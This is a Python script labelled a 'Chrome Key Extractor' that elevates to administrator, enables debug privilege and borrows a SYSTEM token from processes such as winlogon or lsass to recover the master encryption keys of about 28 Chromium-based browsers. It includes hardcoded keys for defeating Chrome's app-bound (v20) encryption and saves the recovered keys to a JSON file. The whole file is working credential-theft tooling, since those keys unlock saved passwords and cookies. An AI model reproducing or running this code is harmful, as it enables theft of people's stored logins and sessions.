# google master key


import sys
import os
import io
import json
import time
import ctypes
import base64
import struct
import winreg
import tempfile
import zipfile
import requests
from datetime import datetime

LOG = []


def log(msg):
    print(msg)
    LOG.append(str(msg))


# ========== Elevation ==========
def _is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False


def _elevate():
    script = os.path.abspath(sys.argv[0])
    params = " ".join('"' + str(a) + '"' for a in sys.argv[1:])
    try:
        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable,
            '"' + script + '" ' + params, None, 1)
    except Exception as e:
        print("[!] Elevation failed: " + str(e))
        return False
    return True


if not _is_admin():
    print("[*] Requesting Administrator privileges...")
    if _elevate():
        sys.exit(0)
    else:
        print("[!] Could not elevate.")
        sys.exit(1)


try:
    import win32crypt
    import win32security
    import win32api
    import win32con
except ImportError:
    print("[!] Missing pywin32. Run: pip install pywin32")
    sys.exit(1)

try:
    import psutil
except ImportError:
    print("[!] Missing psutil. Run: pip install psutil")
    sys.exit(1)

try:
    from Crypto.Cipher import AES, ChaCha20_Poly1305
except ImportError:
    print("[!] Missing pycryptodome. Run: pip install pycryptodome")
    sys.exit(1)


# ========== Browser targets ==========
# Dynamic detection: nuk varet nga user-i. Kontrollon ekzistencën e Local State.
def get_browser_targets():
    """Return list of (name, user_data_path, key_name)."""
    local = os.environ.get("LOCALAPPDATA", "")
    roaming = os.environ.get("APPDATA", "")

    candidates = [
        ("Chrome",           os.path.join(local, "Google", "Chrome", "User Data"),          "Google Chromekey1"),
        ("Chrome Beta",      os.path.join(local, "Google", "Chrome Beta", "User Data"),     "Google Chromekey1"),
        ("Chrome Dev",       os.path.join(local, "Google", "Chrome Dev", "User Data"),      "Google Chromekey1"),
        ("Chrome SxS",       os.path.join(local, "Google", "Chrome SxS", "User Data"),      "Google Chrome SxSkey1"),
        ("Chromium",         os.path.join(local, "Chromium", "User Data"),                  "Google Chromekey1"),
        ("Edge",             os.path.join(local, "Microsoft", "Edge", "User Data"),         "Microsoft Edgekey1"),
        ("Edge Beta",        os.path.join(local, "Microsoft", "Edge Beta", "User Data"),    "Microsoft Edge Beta"),
        ("Edge Dev",         os.path.join(local, "Microsoft", "Edge Dev", "User Data"),     "Microsoft Edge Dev"),
        ("Edge Canary",      os.path.join(local, "Microsoft", "Edge Canary", "User Data"),  "Microsoft Edge Canary"),
        ("Brave",            os.path.join(local, "BraveSoftware", "Brave-Browser", "User Data"),  "Brave Softwarekey1"),
        ("Brave Beta",       os.path.join(local, "BraveSoftware", "Brave-Browser-Beta", "User Data"), "Brave Softwarekey1"),
        ("Brave Nightly",    os.path.join(local, "BraveSoftware", "Brave-Browser-Nightly", "User Data"), "Brave Softwarekey1"),
        ("Vivaldi",          os.path.join(local, "Vivaldi", "User Data"),                   "Vivaldi Technologieskey1"),
        ("Opera Stable",     os.path.join(roaming, "Opera Software", "Opera Stable"),       "Opera Stable"),
        ("Opera GX Stable",  os.path.join(roaming, "Opera Software", "Opera GX Stable"),    "Opera GX Stable"),
        ("Opera Beta",       os.path.join(roaming, "Opera Software", "Opera Beta"),         "Opera Beta"),
        ("Opera Developer",  os.path.join(roaming, "Opera Software", "Opera Developer"),    "Opera Developer"),
        ("Yandex",           os.path.join(local, "Yandex", "YandexBrowser", "User Data"),   "Yandex Browserkey1"),
        ("Iridium",          os.path.join(local, "Iridium", "User Data"),                   "Iridium Browserkey1"),
        ("Epic Privacy",     os.path.join(local, "Epic Privacy Browser", "User Data"),      "Epic Softwarekey1"),
        ("Uran",             os.path.join(local, "uCozMedia", "Uran", "User Data"),         "uCoz Media Urankey1"),
        ("Sputnik",          os.path.join(roaming, "Sputnik", "Sputnik", "User Data"),      "Sputnik Browserkey1"),
        ("CentBrowser",      os.path.join(local, "CentBrowser", "User Data"),               "Cent Studio Browserkey1"),
        ("7Star",            os.path.join(roaming, "7Star", "7Star", "User Data"),          "7Star Browserkey1"),
        ("Amigo",            os.path.join(local, "Amigo", "User Data"),                     "Amigo Browserkey1"),
        ("Torch",            os.path.join(local, "Torch", "User Data"),                     "Torch Media Inc.key1"),
        ("Kometa",           os.path.join(local, "Kometa", "User Data"),                    "Kometa Browserkey1"),
        ("Orbitum",          os.path.join(local, "Orbitum", "User Data"),                   "Orbitum Browserkey1"),
    ]

    # Filtro vetëm ato që ekzistojnë
    existing = []
    for name, base, key_name in candidates:
        ls = os.path.join(base, "Local State")
        if os.path.isfile(ls):
            existing.append((name, base, key_name))
    return existing


# ========== Impersonation ==========
def enable_debug_privilege():
    try:
        h = win32security.OpenProcessToken(
            win32api.GetCurrentProcess(),
            win32con.TOKEN_ADJUST_PRIVILEGES | win32con.TOKEN_QUERY)
        luid = win32security.LookupPrivilegeValue(None, "SeDebugPrivilege")
        win32security.AdjustTokenPrivileges(h, False, [(luid, win32con.SE_PRIVILEGE_ENABLED)])
        return True
    except Exception:
        return False


def impersonate_system_start():
    if not enable_debug_privilege():
        return None
    PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
    try:
        sys_pid = None
        for target in ("winlogon.exe", "services.exe", "lsass.exe"):
            for p in psutil.process_iter(attrs=["pid", "name"]):
                if (p.info.get("name") or "").lower() == target:
                    sys_pid = p.info["pid"]
                    break
            if sys_pid:
                break
        if not sys_pid:
            return None
        ph = None
        for access in (
            win32con.PROCESS_QUERY_INFORMATION | PROCESS_QUERY_LIMITED_INFORMATION,
            PROCESS_QUERY_LIMITED_INFORMATION,
            win32con.PROCESS_QUERY_INFORMATION,
        ):
            try:
                ph = win32api.OpenProcess(access, False, sys_pid)
                break
            except Exception:
                continue
        if not ph:
            return None
        th = win32security.OpenProcessToken(ph, win32con.TOKEN_DUPLICATE | win32con.TOKEN_QUERY)
        dup = win32security.DuplicateTokenEx(th, win32security.SecurityImpersonation,
                                              win32con.MAXIMUM_ALLOWED,
                                              win32security.TokenImpersonation)
        win32security.SetThreadToken(None, dup)
        return True
    except Exception:
        return None


def impersonate_end():
    try:
        win32security.SetThreadToken(None, None)
    except Exception:
        pass


def dpapi_unprotect(data):
    try:
        return win32crypt.CryptUnprotectData(data, None, None, None, 0)[1]
    except Exception:
        return None


# ========== v20 parsing ==========
def parse_blob(blob):
    try:
        b = io.BytesIO(blob)
        p = {}
        hl = struct.unpack('<I', b.read(4))[0]
        p['header'] = b.read(hl)
        cl = struct.unpack('<I', b.read(4))[0]
        if hl + cl + 8 != len(blob):
            return None
        p['flag'] = b.read(1)[0]
        if p['flag'] in (1, 2):
            p['iv'] = b.read(12); p['ct'] = b.read(32); p['tag'] = b.read(16)
        elif p['flag'] == 3:
            p['enc_aes'] = b.read(32); p['iv'] = b.read(12)
            p['ct'] = b.read(32); p['tag'] = b.read(16)
        else:
            p['raw'] = b.read()
        return p
    except Exception:
        return None


def decrypt_cng(encrypted, key_name):
    try:
        ncrypt = ctypes.windll.NCRYPT
        hProvider = ctypes.c_void_p()
        status = ncrypt.NCryptOpenStorageProvider(ctypes.byref(hProvider),
                                                   "Microsoft Software Key Storage Provider", 0)
        if status != 0:
            return None
        hKey = ctypes.c_void_p()
        status = ncrypt.NCryptOpenKey(hProvider, ctypes.byref(hKey), key_name, 0, 0)
        if status != 0:
            ncrypt.NCryptFreeObject(hProvider)
            return None
        pcb = ctypes.c_ulong(0)
        ib = (ctypes.c_ubyte * len(encrypted)).from_buffer_copy(encrypted)
        status = ncrypt.NCryptDecrypt(hKey, ib, len(ib), None, None, 0, ctypes.byref(pcb), 0x40)
        if status != 0:
            ncrypt.NCryptFreeObject(hKey); ncrypt.NCryptFreeObject(hProvider)
            return None
        ob = (ctypes.c_ubyte * pcb.value)()
        status = ncrypt.NCryptDecrypt(hKey, ib, len(ib), None, ob, pcb.value, ctypes.byref(pcb), 0x40)
        ncrypt.NCryptFreeObject(hKey); ncrypt.NCryptFreeObject(hProvider)
        if status != 0:
            return None
        return bytes(ob[:pcb.value])
    except Exception:
        return None


def byte_xor(a, b):
    return bytes([x ^ y for x, y in zip(a, b)])


def derive_v20(parsed, key_name):
    try:
        if parsed['flag'] == 1:
            aes_key = bytes.fromhex("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787")
            c = AES.new(aes_key, AES.MODE_GCM, nonce=parsed['iv'])
            return c.decrypt_and_verify(parsed['ct'], parsed['tag'])
        elif parsed['flag'] == 2:
            chacha = bytes.fromhex("E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660")
            c = ChaCha20_Poly1305.new(key=chacha, nonce=parsed['iv'])
            return c.decrypt_and_verify(parsed['ct'], parsed['tag'])
        elif parsed['flag'] == 3:
            xor_key = bytes.fromhex("CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390")
            aes_key = decrypt_cng(parsed['enc_aes'], key_name)
            if not aes_key:
                return None
            xored = byte_xor(aes_key, xor_key)
            c = AES.new(xored, AES.MODE_GCM, nonce=parsed['iv'])
            return c.decrypt_and_verify(parsed['ct'], parsed['tag'])
        else:
            return parsed.get('raw', b'')
    except Exception:
        return None


# ========== Main key extraction ==========
def get_master_key(local_state, key_name):
    if not os.path.isfile(local_state):
        return None
    try:
        with open(local_state, 'r', encoding='utf-8') as f:
            j = json.load(f)
    except Exception:
        return None

    oc = j.get('os_crypt', {})
    v10 = None
    v20 = None

    if 'encrypted_key' in oc:
        try:
            kb = base64.b64decode(oc['encrypted_key'])[5:]
            v10 = dpapi_unprotect(kb)
            if v10:
                log("  [+] v10 key: " + v10.hex())
        except Exception:
            pass

    if 'app_bound_encrypted_key' in oc:
        try:
            kb = base64.b64decode(oc['app_bound_encrypted_key'])[4:]
            state = impersonate_system_start()
            if state:
                try:
                    d1 = dpapi_unprotect(kb)
                finally:
                    impersonate_end()
                if d1:
                    d2 = dpapi_unprotect(d1)
                    if d2:
                        p = parse_blob(d2)
                        if p:
                            if p['flag'] not in (1, 2, 3):
                                v20 = d2[-32:]
                            else:
                                state = impersonate_system_start()
                                try:
                                    v20 = derive_v20(p, key_name)
                                finally:
                                    impersonate_end()
                            if v20:
                                log("  [+] v20 key: " + v20.hex())
        except Exception:
            pass

    return v10, v20


def main():
    log("=== Chrome Key Extractor ===")
    log("Admin: " + str(_is_admin()))
    log("Time: " + str(datetime.now()))
    log("")

    targets = get_browser_targets()
    if not targets:
        log("[!] No Chromium browsers found")
        return

    log("[*] Found " + str(len(targets)) + " browser profiles:")
    for name, _, _ in targets:
        log("  - " + name)
    log("")

    results = []
    for name, base, key_name in targets:
        log("\n[" + name + "]")
        local_state = os.path.join(base, "Local State")
        try:
            v10, v20 = get_master_key(local_state, key_name)
            results.append({
                "browser": name,
                "path": base,
                "v10": v10.hex() if v10 else None,
                "v20": v20.hex() if v20 else None,
            })
        except Exception as e:
            log("[!] " + name + ": " + str(e))
            results.append({
                "browser": name,
                "path": base,
                "v10": None,
                "v20": None,
                "error": str(e),
            })

    # Save JSON results
    out_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "keys_output.json")
    try:
        with open(out_path, "w", encoding="utf-8") as f:
            json.dump(results, f, indent=2)
        log("\n[i] Results saved to: " + out_path)
    except Exception as e:
        log("[!] Could not save JSON: " + str(e))


if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        log("[!] Fatal: " + str(e))
    finally:
        try:
            input("\nPress Enter to close...")
        except Exception:
            pass